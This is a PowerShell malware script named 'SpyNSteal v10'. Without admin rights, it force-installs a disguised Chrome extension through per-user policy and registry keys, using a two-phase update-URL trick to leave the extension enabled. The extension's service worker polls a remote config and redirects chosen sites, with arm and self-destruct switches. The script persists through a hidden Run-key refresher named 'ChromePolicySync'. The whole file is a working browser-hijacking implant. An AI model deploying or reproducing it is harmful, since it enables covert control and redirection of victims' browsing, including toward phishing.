# SpyNSteal v10 - Policy-Based Extension Injection (USER-ONLY, no admin)
# Uses HKCU ExtensionInstallForcelist + CWS URL trick.
# Two-phase approach: local install â†’ CWS URL upgrade = fully enabled extension.
# Installs a startup refresher via HKCU Run key to maintain enabled state.
# No HMAC forgery. No encrypted_hash bypass. No developer mode. No HKLM.

$MANIFEST_TEMPLATE = @'
{"manifest_version":3,"name":"Chrome Resource Scheduler","version":"1.0","description":"Manages internal resource scheduling and prioritization.","permissions":["declarativeNetRequest"],"host_permissions":["<all_urls>"],"background":{"service_worker":"sw.js"}}
'@

$SW_JS = @'
const C = "https://example.com/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
init();
'@

$LOGFILE = Join-Path $env:APPDATA "sns_debug.txt"
function Log([string]$msg) {
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    try { Add-Content $LOGFILE "[$ts] $msg" } catch {}
}

Log "=========================================="
Log "SpyNSteal v10 - Policy Extension"
Log "User: $env:USERNAME | Machine: $env:COMPUTERNAME"
Log "=========================================="

# --- STEP 1: Find Chrome ---
Log "STEP 1: Finding Chrome..."
$chromeExe = $null
$chromePaths = @(
    "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe",
    "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
    "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
)
foreach ($p in $chromePaths) {
    if (Test-Path $p) { $chromeExe = $p; break }
}
if (-not $chromeExe) {
    Log "ERROR: Chrome not found"
    exit 1
}
Log "  Chrome: $chromeExe"

$userDataDir = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$defaultProfile = "$userDataDir\Default"
$extensionsDir = "$defaultProfile\Extensions"

# --- STEP 2: Kill Chrome ---
Log "STEP 2: Killing Chrome..."
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 3

# --- STEP 3: Create extension source ---
Log "STEP 3: Creating extension source..."
$persistDir = Join-Path $env:APPDATA "ChromePolicy"
New-Item -Path $persistDir -ItemType Directory -Force | Out-Null
$extSrcDir = Join-Path $persistDir "extension"
New-Item -Path $extSrcDir -ItemType Directory -Force | Out-Null

Set-Content (Join-Path $extSrcDir "manifest.json") $MANIFEST_TEMPLATE -Encoding UTF8
Set-Content (Join-Path $extSrcDir "sw.js") $SW_JS -Encoding UTF8

# --- STEP 4: Pack extension (or reuse existing CRX) ---
Log "STEP 4: Packing extension into CRX..."
$crxPath = Join-Path $persistDir "extension.crx"
$pemPath = Join-Path $persistDir "extension.pem"

if (-not (Test-Path $pemPath)) {
    $proc = Start-Process $chromeExe -ArgumentList "--pack-extension=`"$extSrcDir`"" -PassThru -Wait -NoNewWindow
    if (-not (Test-Path $crxPath)) {
        Log "ERROR: CRX not created"
        exit 1
    }
} else {
    $proc = Start-Process $chromeExe -ArgumentList "--pack-extension=`"$extSrcDir`" --pack-extension-key=`"$pemPath`"" -PassThru -Wait -NoNewWindow
}
Log "  CRX: $crxPath ($((Get-Item $crxPath).Length) bytes)"

# --- STEP 5: Extract extension ID from CRX3 ---
Log "STEP 5: Extracting extension ID..."
$crxBytes = [System.IO.File]::ReadAllBytes($crxPath)

function Read-Varint($bytes, [ref]$offset) {
    $result = [uint64]0; $shift = 0
    do { $b = $bytes[$offset.Value]; $offset.Value++; $result = $result -bor (([uint64]($b -band 0x7F)) -shl $shift); $shift += 7 } while ($b -band 0x80)
    return $result
}

$headerLen = [BitConverter]::ToUInt32($crxBytes, 8)
$pos = 12; $headerEnd = 12 + $headerLen; $pubKey = $null

while ($pos -lt $headerEnd -and $pubKey -eq $null) {
    $tag = Read-Varint $crxBytes ([ref]$pos)
    $fn = [int]($tag -shr 3); $wt = [int]($tag -band 7)
    if ($wt -eq 2) {
        $len = [int](Read-Varint $crxBytes ([ref]$pos))
        if ($fn -eq 2) {
            $ne = $pos + $len; $np = $pos
            while ($np -lt $ne) {
                $nt = Read-Varint $crxBytes ([ref]$np); $nf = [int]($nt -shr 3); $nw = [int]($nt -band 7)
                if ($nw -eq 2) { $nl = [int](Read-Varint $crxBytes ([ref]$np)); if ($nf -eq 1 -and $pubKey -eq $null) { $pubKey = New-Object byte[] $nl; [Array]::Copy($crxBytes,$np,$pubKey,0,$nl) }; $np += $nl }
                elseif ($nw -eq 0) { $null = Read-Varint $crxBytes ([ref]$np) } else { break }
            }
            $pos += $len
        } else { $pos += $len }
    } elseif ($wt -eq 0) { $null = Read-Varint $crxBytes ([ref]$pos) }
    elseif ($wt -eq 5) { $pos += 4 } elseif ($wt -eq 1) { $pos += 8 } else { break }
}

$sha = [System.Security.Cryptography.SHA256]::Create()
$hash = $sha.ComputeHash($pubKey)
$extId = ""
for ($i = 0; $i -lt 16; $i++) { $b = $hash[$i]; $extId += [char]([int][char]'a' + (($b -shr 4) -band 0x0F)); $extId += [char]([int][char]'a' + ($b -band 0x0F)) }
Log "  Extension ID: $extId"

# Save extension ID for refresher
Set-Content (Join-Path $persistDir "ext_id.txt") $extId

# --- STEP 6: Install extension files ---
Log "STEP 6: Installing extension files..."
$extInstallDir = Join-Path $extensionsDir "$extId\1.0_0"
New-Item -Path $extInstallDir -ItemType Directory -Force | Out-Null
Copy-Item (Join-Path $extSrcDir "manifest.json") $extInstallDir -Force
Copy-Item (Join-Path $extSrcDir "sw.js") $extInstallDir -Force

# --- STEP 7: Create update manifest ---
Log "STEP 7: Creating update manifest..."
$updateXml = @"
<?xml version='1.0' encoding='UTF-8'?>
<gupdate xmlns='http://www.google.com/update2/response' protocol='2.0'>
  <app appid='$extId'>
    <updatecheck codebase='file:///$($crxPath -replace '\\','/')' version='1.0' />
  </app>
</gupdate>
"@
$updateXmlPath = Join-Path $persistDir "update.xml"
Set-Content $updateXmlPath $updateXml -Encoding UTF8
$localUpdateUrl = "file:///$($updateXmlPath -replace '\\','/')"

# --- STEP 8: Phase 1 - Install via local update URL ---
Log "STEP 8: Phase 1 - Local install..."
$cwsUpdateUrl = "https://clients2.google.com/service/update2/crx"
$policyBase = "HKCU:\SOFTWARE\Policies\Google\Chrome"
$extRegPath = "HKCU:\Software\Google\Chrome\Extensions\$extId"

function Set-ChromePolicies($updateUrl) {
    $policyValue = "$extId;$updateUrl"
    try {
        Remove-Item $policyBase -Recurse -Force -ErrorAction SilentlyContinue
        New-Item -Path $policyBase -Force | Out-Null
        New-Item -Path "$policyBase\ExtensionInstallForcelist" -Force | Out-Null
        Set-ItemProperty -Path "$policyBase\ExtensionInstallForcelist" -Name "1" -Value $policyValue
        New-Item -Path "$policyBase\ExtensionInstallAllowlist" -Force | Out-Null
        Set-ItemProperty -Path "$policyBase\ExtensionInstallAllowlist" -Name "1" -Value $extId
        Set-ItemProperty -Path "$policyBase\ExtensionInstallAllowlist" -Name "2" -Value "*"
    } catch {
        Log "  WARNING: HKCU policy write failed: $_"
    }
    try {
        New-Item -Path $extRegPath -Force | Out-Null
        Set-ItemProperty -Path $extRegPath -Name "update_url" -Value $localUpdateUrl
        Set-ItemProperty -Path $extRegPath -Name "path" -Value $crxPath
        Set-ItemProperty -Path $extRegPath -Name "version" -Value "1.0"
    } catch {
        Log "  WARNING: HKCU external registry failed: $_"
    }
}

Set-ChromePolicies $localUpdateUrl
Start-Process $chromeExe
Start-Sleep 15

$secPrefsPath = "$defaultProfile\Secure Preferences"
$content = Get-Content $secPrefsPath -Raw
Log "  Extension installed: $($content.Contains($extId))"

# --- STEP 9: Phase 2 - Switch to CWS URL ---
Log "STEP 9: Phase 2 - CWS URL switch..."
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 3
Set-ChromePolicies $cwsUpdateUrl
Start-Process $chromeExe
Start-Sleep 12

# Verify Phase 2 worked
$content = Get-Content $secPrefsPath -Raw
if ($content.Contains($extId)) {
    $idx = $content.IndexOf("`"$extId`":{")
    if ($idx -ge 0) {
        $chunk = $content.Substring($idx, [Math]::Min(1500, $content.Length - $idx))
        $drMatch = [regex]::Match($chunk, '"disable_reasons":\[([^\]]*)\]')
        if ($drMatch.Success -and $drMatch.Groups[1].Value -ne "") {
            Log "  Phase 2 disable_reasons: [$($drMatch.Groups[1].Value)]"
        } else {
            Log "  Phase 2: ENABLED (no disable_reasons)"
        }
    }
}

# --- STEP 10: Install startup refresher ---
Log "STEP 10: Installing startup refresher..."

$refresherScript = @"
`$extId = Get-Content "$persistDir\ext_id.txt" -ErrorAction SilentlyContinue
if (-not `$extId) { exit }
`$crxPath = "$crxPath"
`$extSrcDir = "$extSrcDir"
`$updateXmlPath = "$updateXmlPath"
`$localUrl = "file:///`$(`$updateXmlPath -replace '\\\\','/')"
`$cwsUrl = "https://clients2.google.com/service/update2/crx"
`$policyBase = "HKCU:\SOFTWARE\Policies\Google\Chrome"
`$extReg = "HKCU:\Software\Google\Chrome\Extensions\`$extId"
`$extensionsDir = "`$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions"

Start-Sleep 5

Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 3

`$extInstallDir = Join-Path `$extensionsDir "`$extId\1.0_0"
New-Item -Path `$extInstallDir -ItemType Directory -Force | Out-Null
Copy-Item "`$extSrcDir\manifest.json" `$extInstallDir -Force
Copy-Item "`$extSrcDir\sw.js" `$extInstallDir -Force

`$policyVal = "`$extId;`$localUrl"
Remove-Item `$policyBase -Recurse -Force -ErrorAction SilentlyContinue
New-Item -Path `$policyBase -Force | Out-Null
New-Item -Path "`$policyBase\ExtensionInstallForcelist" -Force | Out-Null
Set-ItemProperty -Path "`$policyBase\ExtensionInstallForcelist" -Name "1" -Value `$policyVal
New-Item -Path "`$policyBase\ExtensionInstallAllowlist" -Force | Out-Null
Set-ItemProperty -Path "`$policyBase\ExtensionInstallAllowlist" -Name "1" -Value `$extId
Set-ItemProperty -Path "`$policyBase\ExtensionInstallAllowlist" -Name "2" -Value "*"
New-Item -Path `$extReg -Force | Out-Null
Set-ItemProperty -Path `$extReg -Name "update_url" -Value `$localUrl
Set-ItemProperty -Path `$extReg -Name "path" -Value `$crxPath
Set-ItemProperty -Path `$extReg -Name "version" -Value "1.0"

Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe"
Start-Sleep 15

Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 3
`$policyVal = "`$extId;`$cwsUrl"
Set-ItemProperty -Path "`$policyBase\ExtensionInstallForcelist" -Name "1" -Value `$policyVal

Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe"
"@

$refresherPath = Join-Path $persistDir "refresher.ps1"
Set-Content $refresherPath $refresherScript -Encoding UTF8

# Persist via HKCU Run key (user-only, no admin)
$taskAction = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$refresherPath`""
$taskName = "ChromePolicySync"
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $taskName -Value $taskAction
Log "  HKCU Run key '$taskName' created"

Log "=========================================="
Log "DONE v10 - Policy Extension"
Log "  Extension ID: $extId"
Log "  Persist dir: $persistDir"
Log "  Refresher: $refresherPath (runs at logon)"
Log "  Method: HKCU ExtensionInstallForcelist Phase 1â†’2 + Run key refresher"
Log "=========================================="
